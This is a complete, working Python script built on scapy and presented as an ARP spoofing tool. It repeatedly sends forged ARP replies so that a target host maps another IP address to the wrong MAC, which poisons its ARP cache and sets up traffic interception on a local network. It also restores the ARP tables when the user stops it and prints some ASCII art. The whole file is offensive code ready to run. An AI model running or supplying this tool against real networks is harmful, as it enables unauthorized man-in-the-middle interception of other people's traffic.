from scapy.all import ARP, Ether, send, srp
import time
import argparse
import os


def get_mac(ip):
    """Get the MAC address of a target IP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None


def spoof(target_ip, spoof_ip):
    """Send an ARP response to the target, poisoning its ARP cache."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not find MAC address for {target_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    print(f"[+] Spoofed {target_ip} into thinking {spoof_ip} is at {target_mac}")


def restore(destination_ip, source_ip):
    """Restore the network by sending correct ARP responses."""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        return

    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)
    print(f"[+] Restored ARP table for {destination_ip}")


def print_ascii():
    """Prints ASCII art of a guy smoking a cigarette."""
    ascii_art = """
        (  -_-)_\
         (o o) \\
          |\_/|   ~
    """
    print(ascii_art)


def main():
    print_ascii()
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-s", "--spoof", required=True, help="IP to spoof")
    args = parser.parse_args()

    try:
        print("[+] Starting ARP spoofing...")
        while True:
            spoof(args.target, args.spoof)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C. Restoring ARP tables...")
        restore(args.target, args.spoof)
        print("[+] ARP tables restored. Exiting.")


if __name__ == "__main__":
    main()
